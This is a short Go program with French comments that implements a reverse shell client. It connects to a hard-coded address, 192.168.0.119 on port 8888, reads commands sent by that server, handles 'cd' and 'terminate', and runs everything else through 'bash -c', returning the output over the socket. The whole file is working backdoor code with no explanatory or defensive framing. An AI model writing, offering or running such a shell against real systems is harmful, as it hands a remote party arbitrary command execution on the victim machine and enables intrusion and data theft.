package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"bufio"
)

func main() {
	host := "192.168.0.119"
	port := "8888"

	// Connexion au serveur
	conn, err := net.Dial("tcp", host+":"+port)
	if err != nil {
		fmt.Println("Erreur de connexion:", err)
		return
	}
	defer conn.Close()

	reader := bufio.NewReader(conn)

	for {
		// Lire la commande envoyée par le serveur
		cmd, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Erreur de lecture:", err)
			return
		}

		cmd = strings.TrimSpace(cmd)

		if cmd == "terminate" {
			// Terminer la connexion
			break
		} else if strings.HasPrefix(cmd, "cd") {
			// Commande "cd"
			dir := strings.TrimSpace(cmd[3:])
			if dir != "" {
				err := os.Chdir(dir)
				if err != nil {
					conn.Write([]byte("Erreur lors du changement de répertoire\n"))
				} else {
					conn.Write([]byte("Répertoire changé\n"))
				}
			} else {
				conn.Write([]byte("Aucun répertoire spécifié\n"))
			}
		} else if cmd == "" {
			// Si aucune commande n'est envoyée
			conn.Write([]byte("Aucune commande envoyée\n"))
		} else {
			// Exécution de la commande
			output, err := exec.Command("bash", "-c", cmd).CombinedOutput()
			if err != nil {
				conn.Write([]byte(fmt.Sprintf("Erreur: %v\n", err)))
			}
			if len(output) > 0 {
				conn.Write(output)
			} else {
				conn.Write([]byte("Aucune sortie\n"))
			}
		}
	}
}
